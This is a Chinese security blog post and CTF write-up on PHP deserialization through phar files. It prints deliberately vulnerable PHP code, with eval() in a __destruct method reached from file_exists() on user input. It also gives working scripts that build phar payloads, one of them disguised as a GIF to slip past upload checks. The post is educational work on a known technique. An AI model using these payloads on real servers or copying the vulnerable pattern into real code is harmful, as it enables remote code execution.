<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>利用phar文件拓展php反序列化攻击 | F4de&#39;s blog</title>
    <meta name="generator" content="VuePress 1.5.2">
    <link rel="icon" href="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201002215345.jpg">
    <meta name="description" content="西郊有密林，助君出重围。">
    <meta name="keywords" content="Web安全 | CTF">
    <meta name="baidu-site-verification" content="7F55weZDDc">
    <meta name="theme-color" content="#11a8cd">
    <link rel="preload" href="/assets/css/0.styles.c3dab397.css" as="style"><link rel="preload" href="/assets/js/app.23243609.js" as="script"><link rel="preload" href="/assets/js/2.b6b5fde6.js" as="script"><link rel="preload" href="/assets/js/11.aa0a0e27.js" as="script"><link rel="prefetch" href="/assets/js/10.61fe8e74.js"><link rel="prefetch" href="/assets/js/12.f76d046e.js"><link rel="prefetch" href="/assets/js/13.e7eb76d3.js"><link rel="prefetch" href="/assets/js/14.6843e7d6.js"><link rel="prefetch" href="/assets/js/15.876aebbe.js"><link rel="prefetch" href="/assets/js/16.7bda9fb3.js"><link rel="prefetch" href="/assets/js/17.4d23d90c.js"><link rel="prefetch" href="/assets/js/18.8e3bf455.js"><link rel="prefetch" href="/assets/js/19.e2910e1f.js"><link rel="prefetch" href="/assets/js/20.d3ad9048.js"><link rel="prefetch" href="/assets/js/21.44a5eb88.js"><link rel="prefetch" href="/assets/js/22.9fdb32fe.js"><link rel="prefetch" href="/assets/js/23.a4171f9f.js"><link rel="prefetch" href="/assets/js/24.1dc52702.js"><link rel="prefetch" href="/assets/js/25.0d5d1524.js"><link rel="prefetch" href="/assets/js/26.acc4bd8a.js"><link rel="prefetch" href="/assets/js/27.70c3076c.js"><link rel="prefetch" href="/assets/js/28.a6cd030a.js"><link rel="prefetch" href="/assets/js/29.74b979df.js"><link rel="prefetch" href="/assets/js/3.b2dd61fd.js"><link rel="prefetch" href="/assets/js/30.48245f1e.js"><link rel="prefetch" href="/assets/js/31.100f6dc2.js"><link rel="prefetch" href="/assets/js/32.7fc433c9.js"><link rel="prefetch" href="/assets/js/33.29387a0a.js"><link rel="prefetch" href="/assets/js/34.9de6377e.js"><link rel="prefetch" href="/assets/js/35.8d8e3101.js"><link rel="prefetch" href="/assets/js/36.cffc3ac2.js"><link rel="prefetch" href="/assets/js/37.78556217.js"><link rel="prefetch" href="/assets/js/4.1d65e77b.js"><link rel="prefetch" href="/assets/js/5.477d6d12.js"><link rel="prefetch" href="/assets/js/6.9074f6ba.js"><link rel="prefetch" href="/assets/js/7.3da58132.js"><link rel="prefetch" href="/assets/js/8.10db4dab.js"><link rel="prefetch" href="/assets/js/9.e2574eb5.js">
    <link rel="stylesheet" href="/assets/css/0.styles.c3dab397.css">
  </head>
  <body class="theme-mode-light">
    <div id="app" data-server-rendered="true"><div class="theme-container sidebar-open have-rightmenu"><header class="navbar blur"><div title="目录" class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><img src="/img/EB-logo.png" alt="F4de's blog" class="logo"> <span class="site-name can-hide">F4de's blog</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/" class="nav-link">首页</a></div><div class="nav-item"><a href="/writeup/" class="nav-link">WP整理</a></div><div class="nav-item"><a href="/technology/" class="nav-link">技术文章</a></div><div class="nav-item"><a href="/study/" class="nav-link">学习笔记</a></div><div class="nav-item"><a href="/essay/" class="nav-link">其它随笔</a></div><div class="nav-item"><a href="/about/" class="nav-link">关于|友链</a></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar" style="display:none;"><div class="blogger"><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201002215345.jpg"> <div class="blogger-info"><h3>F4de</h3> <span>Syclover | Web</span></div></div> <nav class="nav-links"><div class="nav-item"><a href="/" class="nav-link">首页</a></div><div class="nav-item"><a href="/writeup/" class="nav-link">WP整理</a></div><div class="nav-item"><a href="/technology/" class="nav-link">技术文章</a></div><div class="nav-item"><a href="/study/" class="nav-link">学习笔记</a></div><div class="nav-item"><a href="/essay/" class="nav-link">其它随笔</a></div><div class="nav-item"><a href="/about/" class="nav-link">关于|友链</a></div> <!----></nav>  <ul class="sidebar-links"><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading open"><span>php安全</span> <span class="arrow down"></span></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/pages/93d259/" class="sidebar-link">初探XXE漏洞攻击</a></li><li><a href="/pages/971e5d/" aria-current="page" class="active sidebar-link">利用phar文件拓展php反序列化攻击</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/971e5d/#开始的一点废话" class="sidebar-link">开始的一点废话</a></li><li class="sidebar-sub-header"><a href="/pages/971e5d/#前言" class="sidebar-link">前言</a></li><li class="sidebar-sub-header"><a href="/pages/971e5d/#原理分析" class="sidebar-link">原理分析</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/971e5d/#什么是phar文件" class="sidebar-link">什么是phar文件</a></li><li class="sidebar-sub-header"><a href="/pages/971e5d/#phar文件的结构" class="sidebar-link">phar文件的结构</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/971e5d/#利用phar文件攻击" class="sidebar-link">利用phar文件攻击</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/971e5d/#demo1-任意代码执行（多见于ctf）" class="sidebar-link">Demo1 任意代码执行（多见于CTF）</a></li><li class="sidebar-sub-header"><a href="/pages/971e5d/#demo2-phar文件幻数" class="sidebar-link">Demo2 phar文件幻数</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/971e5d/#利用条件" class="sidebar-link">利用条件</a></li><li class="sidebar-sub-header"><a href="/pages/971e5d/#geekgame-2020-反序列化？" class="sidebar-link">[GeekGame 2020] 反序列化？</a></li><li class="sidebar-sub-header"><a href="/pages/971e5d/#后记" class="sidebar-link">后记</a></li></ul></li><li><a href="/pages/715643/" class="sidebar-link">PHP新特性绕过disable_functions</a></li></ul></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>python安全</span> <span class="arrow right"></span></p> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>Java安全</span> <span class="arrow right"></span></p> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>其他</span> <span class="arrow right"></span></p> <!----></section></li></ul> </aside> <div><main class="page"> <div class="theme-vdoing-wrapper bg-style-6"><div class="articleInfo-wrap" data-v-f945b7fe><div class="articleInfo" data-v-f945b7fe><ul class="breadcrumbs" data-v-f945b7fe><li data-v-f945b7fe><a href="/" title="首页" class="iconfont icon-home router-link-active" data-v-f945b7fe></a></li> <li data-v-f945b7fe><span data-v-f945b7fe>技术文章</span></li> <li data-v-f945b7fe><span data-v-f945b7fe>php安全</span></li></ul> <div class="info" data-v-f945b7fe><div title="作者" class="author iconfont icon-touxiang" data-v-f945b7fe><a href="javascript:;" data-v-f945b7fe>F4de</a></div> <div title="创建时间" class="date iconfont icon-riqi" data-v-f945b7fe><a href="javascript:;" data-v-f945b7fe>2020-10-03</a></div> <!----></div></div></div> <!----> <div class="content-wrapper"><div class="right-menu-wrapper"><div class="right-menu-margin"><div class="right-menu-content"></div></div></div> <h1><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAeCAYAAAA7MK6iAAAAAXNSR0IArs4c6QAABH1JREFUSA3tVl1oHFUUPmdmd2ltklqbpJDiNnXFmgbFktho7YMPNiJSSZM0+CAYSkUELVhM6YuwIPpgoOKDqOBDC0XE2CQoNtQXBUFTTcCi+Wlh1V2TQExsUzcltd3M9Tt3ZjZzZ2fT+OJTL8yeM+eee757fmeJbq//KQL8X3DUSFOcfr7cRsRtxNQMWueeVzOkaITIGqQHNg5y8+jNW9ldM7A6nTpAjuolUikAwq7CE3WcM2RRDz+XGVgN3FptU/aUSlvq9Pa3iZ1+sgAqJyyAFqkipd9dqiwHF3P65YycLWc/6sqGrvoEoIp6DOFaX5h6+dnfjkWprwqsPk0dUGq5vySwDImC10KxFHgGL1SWoc92O3eVht09qdXNH11I2SsTsJYqMWzihqGMi+A+Garf3BAuuLI5oGlULyNfyB/HYNujwktOfRrMr5t77NmevqaUopx0grnKAyvVpmwUDB4x6FPXuGvYLTDwWsejwgtgkYKPqRJg8SV6xaiZ3ZTppGneS4yfH5/66fZSDHv+QZci/+h5c5UHtpy67JUqGppM0sh0Nc1dW6/N1W5Yoqat8/TU/VnadmdeW2PLLSyh0cvxBs3KbqTmwYPpxN4do/mzE8nEpvX/UMu2Wbp74zUAK5q6WkHns7V0eWkdPbPzd3rxkTGybadYySumVzhcaJFbs5UrEkQ/+CK8gF5dnh/6ciIZ73gwQ927L1IitoxKLXYP3SjYdOrHHfTZhRRlFyrorafPk20B3HPD1y2G3qKZME5Jcf3t/HUC13/8tSd++vqFveMUTwAUxSUFI1QekR1+bIze3D9MF2aq6cPvG72CgnldWCFqyRw3lwH8ZMerjTD9ElRO7Gv44wNpC90aASqGfVlz/Rx17srQ57/UU26hkhQqUB7dBR71WmzQhHUnblGmVOEw0jhbV1n9OlXUDCIRGaNV5Jp43N516fN7JmnTHdfp7Hgy0luO4aMhtkLL8Bi3bUWYvzh5Mn1dTxrL6QmGuRhGL/TiTTxRoEdTszSaq9GR0NGA3KdkOz3hqSV3MIDhQ5IVX/Ivx3umBti2es2h4eZby7x8br1rkf7Mo90AqC8aQ3sJeNzqFRu+vSANAQe3PL7l0HGOAdwDCeZYvNKeoZp1Qfs6Aipndh86HmFRi0LAnEO47wsqM6cdfjh3jBPUzhZy7nvlUfFsamED1VQt6aISHVymXZ/B2aCtIG8AI8xfobj2d3en1wWVhOeHELKmLQ1s211s88comkv4UCwWyF787mJdYXtNfhKAXVqnKTq8QZvGAGGOfaTo5pGZ/PwbUCr5+DPr/1J92JNHr9aOl/F3iI5+O1nfybsGxoimvZ3ViWSluDITw3P37mypheDIPY0tw7+O/5ApbkYw+zpfaUVu32Pi98+defdUhEpZkRFq0aqyNh9FuL9hpYbEm6iwi0z2REd09ZmyENEbuhjDWzKvZXTqKYaBIr3tt5kuPtQBZFvEUwHt60vfCNu41XsksH9Ij1BMMz1Y0OOunHNShFIP5868g5zeXmuLwL9T4b6Q2+KejgAAAABJRU5ErkJggg==">
          利用phar文件拓展php反序列化攻击
        </h1> <div class="theme-vdoing-content content__default"><h2 id="开始的一点废话"><a href="#开始的一点废话" class="header-anchor">#</a> 开始的一点废话</h2> <p>最近比赛打的挺菜的，但是还是跟着师傅们学到了很多东西的，不管怎么样，还是踏踏实实一点点学，仔细写写PHP代码，不能浮于表面。</p> <h2 id="前言"><a href="#前言" class="header-anchor">#</a> 前言</h2> <p>通常利用反序列化漏洞的时候，只能将反序列化后的字符串传入到unserialize()中，这种漏洞随着代码安全性的提高之后难以利用。在2018年的Black Hat会议上，Sam Thomas提出了利用phar文件会以序列化字符串的形式存储用户自定义的meta_data这一点特性，拓展了php反序列化漏洞的攻击。该方法依赖于文件系统的函数（file_exists()、is_dir()等）参数可控的情况下，配合phar://伪协议对phar文件内容的解析，自动反序列化meta_data中的内容，可以不依赖于unserialize()进行反序列化操作。</p> <p>参考：https://paper.seebug.org/680/</p> <hr> <h2 id="原理分析"><a href="#原理分析" class="header-anchor">#</a> 原理分析</h2> <p>在先说phar文件如何实现php反序列化攻击的之前，先要明白什么是phar文件以及phar文件的结构。</p> <h3 id="什么是phar文件"><a href="#什么是phar文件" class="header-anchor">#</a> 什么是phar文件</h3> <ul><li>phar(PHP Archive)是PHP里的一种打包文件，用于归档 。PHP版本&gt;=5.3的时候默认开启对phar文件的支持。</li> <li>phar文件默认状态是只读。使用phar文件不需要任何额外配置。</li> <li>phar://伪协议用来解析phar文件的内容。</li></ul> <h3 id="phar文件的结构"><a href="#phar文件的结构" class="header-anchor">#</a> phar文件的结构</h3> <h4 id="a-stub"><a href="#a-stub" class="header-anchor">#</a> a stub</h4> <p>可以理解位一种标志，其格式为<code>xxx&lt;?php xxx;__HALT_COMPILER();?&gt;</code>，前面的内容不限，但是一定要以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展无法识别这个文件，也就是说，phar扩展是以<code>__HALT_COMPILER();?&gt;</code>为标志来识别phar文件的。</p> <h4 id="a-manifest-describing-the-contents"><a href="#a-manifest-describing-the-contents" class="header-anchor">#</a> a manifest describing the contents</h4> <p><img src="https://jinyiwei1226.coding.net/p/markdownpic/d/markdownpic/git/raw/master/pic/5791f169574331596e7a890477a368438f51b6c008748d62b0410016bc636a79.png" alt="图2"><br>
phar文件的本质就是一种压缩文件，每个被压缩文件的权限，属性等信息都被存放在这里，另外，用户自定义的meta-data也会被储存在这里，这是实现phar文件攻击的核心。</p> <h4 id="the-file-contents"><a href="#the-file-contents" class="header-anchor">#</a> the file contents</h4> <p>被压缩的内容</p> <h4 id="optional-a-signature-for-verifying-phar-integrity-phar-file-format-only"><a href="#optional-a-signature-for-verifying-phar-integrity-phar-file-format-only" class="header-anchor">#</a> [optional] a signature for verifying Phar integrity (phar file format only)</h4> <p>文件签名，放在文件末尾。格式如下：
<img src="https://jinyiwei1226.coding.net/p/markdownpic/d/markdownpic/git/raw/master/pic/aa6adc74de3e477fe1a1e90c929ca60b3a5e890aca2c9a5a54e4e9960e7ce12a.png" alt="图3"></p> <hr> <h2 id="利用phar文件攻击"><a href="#利用phar文件攻击" class="header-anchor">#</a> 利用phar文件攻击</h2> <h3 id="demo1-任意代码执行（多见于ctf）"><a href="#demo1-任意代码执行（多见于ctf）" class="header-anchor">#</a> Demo1 任意代码执行（多见于CTF）</h3> <p>要攻击的站点源码如下：</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>&lt;?php

class Flag{
    public $code;
    public function __destruct()
    {
        // TODO: Implement __destruct() method.
        eval($this-&gt;code);
    }
}

$filename = $_GET['filename'];

file_exists($filename);

?&gt;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br></div></div><p>传入文件名，检测该文件是否存在。</p> <p>下面开始构造phar文件进行任意代码执行</p> <ul><li>（注）开启phar文件的生成权限需要修改php的配置文件php.ini，将<code>;phar.readonly = On</code>修改为<code>Off</code>即可，注意去掉<code>;</code>。
<img src="https://jinyiwei1226.coding.net/p/markdownpic/d/markdownpic/git/raw/master/pic/16568b05dc47f6a033d3d7a4558b0b8062b97c9842899500555e490a1273a8f5.png" alt="图4"></li></ul> <ol><li>生成一个phar文件，生成phar文件的代码如下：</li></ol> <div class="language- line-numbers-mode"><pre class="language-text"><code>
&lt;?php
class Flag{
    public $code;
}               //要攻击站点已存在的类
                
@unlink(&quot;test.phar&quot;);   //文件名 test.phar
$phar = new Phar(&quot;test.phar&quot;);       
$phar-&gt;startBuffering();
$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置sub
$a = new Flag();   //实例化类，让phar文件自动序列化，利用phar文件自动序列化meta_data的特点进行攻击
$a-&gt;code = &quot;phpinfo();&quot;;
$phar-&gt;setMetadata($a); //将自定义的meta_data存入manifest
$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //要压缩的文件
$phar-&gt;stopBuffering(); //自动计算签名
?&gt;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br></div></div><ol start="2"><li><p>执行完上述代码之后，会在本地这个php文件的同目录下生成一个phar文件。如下图：
<img src="https://jinyiwei1226.coding.net/p/markdownpic/d/markdownpic/git/raw/master/pic/8c24f29c81b0880306154327242b1d19cd9b2aad6ee56eec73f46b0ea3b84e6f.png" alt="图5"></p></li> <li><p>用winhex查看该文件：
<img src="https://jinyiwei1226.coding.net/p/markdownpic/d/markdownpic/git/raw/master/pic/241fa2ce3416d96d418aafb98f4685924683f23d523c5ada0cb4735a17d4b659.png" alt="图6"></p></li> <li><p>可以看到，我们自定义的meta_data以序列化字符串的形式存储在了phar文件里。有序列化必然会有反序列化，PHP的大部分文件系统函数在通过phar://协议解析phar文件的时候，都会将meta_data进行反序列化操作，受影响的文件系统函数如下：
<img src="https://jinyiwei1226.coding.net/p/markdownpic/d/markdownpic/git/raw/master/pic/f8582ab5a85283deda73be8e363adc3c27a8d93a2bf5847b900c2241732b0d5f.png" alt="图7"></p></li> <li><p>利用phar文件以及phar://伪协议进行攻击：
<img src="https://jinyiwei1226.coding.net/p/markdownpic/d/markdownpic/git/raw/master/pic/e9a13eb25df33d1acced550ac26b97aef5805a74756a6900657a2d4cd5bb8dd8.png" alt="图8"></p></li></ol> <p>实现了任意代码执行。</p> <ul><li>来看php底层是怎么处理的：
<img src="https://jinyiwei1226.coding.net/p/markdownpic/d/markdownpic/git/raw/master/pic/2a67ea04071d7c0cd911d069c22a305f63cc8c1bc4920b24dff2889ed1c77a6a.png" alt="图9"></li></ul> <p>可以看到，底层代码对meta_data进行了反序列化操作。</p> <h3 id="demo2-phar文件幻数"><a href="#demo2-phar文件幻数" class="header-anchor">#</a> Demo2 phar文件幻数</h3> <ul><li>之前提到过，phar扩展是以<code>__HALT_COMPILER();?&gt;</code>来识别phar文件的，也就是说，我们可以修改phar文件头前半部分的内容，来绕过某些检测。</li></ul> <div class="language- line-numbers-mode"><pre class="language-text"><code>&lt;?php
class Flag{
    public $code;
}               //要攻击站点已存在的类
                
@unlink(&quot;test.phar&quot;);   //文件名 test.phar
$phar = new Phar(&quot;test.phar&quot;);       
$phar-&gt;startBuffering();
$phar-&gt;setStub(&quot;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置sub
$a = new Flag();   //实例化类，让phar文件自动序列化，利用phar文件自动序列化meta_data的特点进行攻击
$a-&gt;code = &quot;phpinfo();&quot;;
$phar-&gt;setMetadata($a); //将自定义的meta_data存入manifest
$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //要压缩的文件
$phar-&gt;stopBuffering(); //自动计算签名
?&gt;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><p>在sub中新增加了<code>GIF89a</code>这部分，将phar文件伪装成GIF文件来绕过某些检测。
<img src="https://jinyiwei1226.coding.net/p/markdownpic/d/markdownpic/git/raw/master/pic/075787b07b4cd28e7c4c8b5dc1a711d9379fc2a4c2ce53117acf924bc37047e2.png" alt="图10"></p> <p>将生成的test.phar文件修改后缀名，改为test.gif，再次进行测试：
<img src="https://jinyiwei1226.coding.net/p/markdownpic/d/markdownpic/git/raw/master/pic/e1bff0a27b7d9c8d965827f368a6b083d4df5c65bbe3ed1a2093460f948c52a0.png" alt="图11"></p> <hr> <h2 id="利用条件"><a href="#利用条件" class="header-anchor">#</a> 利用条件</h2> <ul><li>phar文件必须可以上传到服务端。</li> <li>必须要有可以利用的魔术方法(__wakeup()、__destruct())等。</li> <li>文件系统的相关函数参数可控，且<code>phar</code>、<code>:</code>、<code>/</code>等关键字没有被过滤。</li></ul> <hr> <h2 id="geekgame-2020-反序列化？"><a href="#geekgame-2020-反序列化？" class="header-anchor">#</a> [GeekGame 2020] 反序列化？</h2> <ol><li>进入题目，是一个文件上传的页面，下面给了提示，所以我们到<code>/vulnerable.php</code>看看。</li> <li>直接给了源码：</li></ol> <div class="language- line-numbers-mode"><pre class="language-text"><code>&lt;?php
highlight_file(__FILE__);
if (isset($_GET['filename'])) {
    $filename = $_GET['filename'];
} else {
    $filename = &quot;&quot;;
}

class Flag
{
    private $code;

    function __destruct()
    {
        // TODO: Implement __destruct() method.
        eval($this-&gt;code);
    }
}

if (file_exists($filename)) {
    echo &quot;文件存在的呢;&quot;;
} else {
    echo &quot;啊这，文件不在哦&quot;;
}
?&gt;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br></div></div><ol start="3"><li>很明显是利用反序列化调用<code>__destruct()</code>方法来执行任意代码，但是没有unserialize()函数，要想调用魔术方法，结合题目一开始的文件上传，很容易想到phar文件的上传。</li> <li>利用Demo所示的代码，生成phar文件，改为GIF文件来绕过检测，直接拿到Flag。
<img src="https://jinyiwei1226.coding.net/p/markdownpic/d/markdownpic/git/raw/master/pic/0bd2f16fb119b987ae2c33b18c31de21b4c41f27f4a655235a92016e41d62a43.png" alt="图12"><br> <img src="https://jinyiwei1226.coding.net/p/markdownpic/d/markdownpic/git/raw/master/pic/93c58d7f46a4ec11f377fe41928adb4ee5c4918315467b3f7afb4e53f2eaf75a.png" alt="图13"></li></ol> <h2 id="后记"><a href="#后记" class="header-anchor">#</a> 后记</h2> <p>比赛当时拿到这道题目没有一点思路，多亏了一位师傅提醒“一个phar文件的上传”，才拿到了Flag，故有此文。</p></div></div> <div class="page-edit"><!----> <div class="tags"><a href="/tags/?tag=PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96" title="标签">#PHP反序列化</a></div> <!----></div> <div class="page-nav-wapper"><div class="page-nav-centre-wrap"><a href="/pages/93d259/" class="page-nav-centre page-nav-centre-prev"><div class="tooltip">初探XXE漏洞攻击</div></a> <a href="/pages/715643/" class="page-nav-centre page-nav-centre-next"><div class="tooltip">PHP新特性绕过disable_functions</div></a></div> <div class="page-nav"><p class="inner"><span class="prev">
        ←
        <a href="/pages/93d259/" class="prev">初探XXE漏洞攻击</a></span> <span class="next"><a href="/pages/715643/">PHP新特性绕过disable_functions</a>→
      </span></p></div></div></div> <div class="article-list"><div class="article-title"><a href="/archives/" class="iconfont icon-bi">最近更新</a></div> <div class="article-wrapper"><dl><dd>01</dd> <dt><a href="/pages/152581/"><div>RMI与JNDI（一）</div></a> <span>01-29</span></dt></dl><dl><dd>02</dd> <dt><a href="/pages/fae557/"><div>Java8-Stream</div></a> <span>01-03</span></dt></dl><dl><dd>03</dd> <dt><a href="/pages/5d070a/"><div>谈一谈Java动态加载字节码的方式</div></a> <span>12-18</span></dt></dl> <dl><dd></dd> <dt><a href="/archives/" class="more">更多文章&gt;</a></dt></dl></div></div> </main></div> <div class="footer"><div class="icons"></div> 
  Theme by
  <a href="https://github.com/xugaoyi/vuepress-theme-vdoing" target="_blank" title="本站主题">Vdoing</a> 
    | Copyright © 2019-2021
    <span></span></div> <div class="buttons"><div title="返回顶部" class="button blur go-to-top iconfont icon-fanhuidingbu" style="display:none;"></div> <div title="去评论" class="button blur go-to-comment iconfont icon-pinglun" style="display:none;"></div> <div title="主题模式" class="button blur theme-mode-but iconfont icon-zhuti"><ul class="select-box" style="display:none;"><li class="iconfont icon-zidong">跟随系统</li><li class="iconfont icon-rijianmoshi">浅色模式</li><li class="iconfont icon-yejianmoshi">深色模式</li><li class="iconfont icon-yuedu">阅读模式</li></ul></div></div> <!----></div><div class="global-ui"><div></div></div></div>
    <script src="/assets/js/app.23243609.js" defer></script><script src="/assets/js/2.b6b5fde6.js" defer></script><script src="/assets/js/11.aa0a0e27.js" defer></script>
  </body>
</html>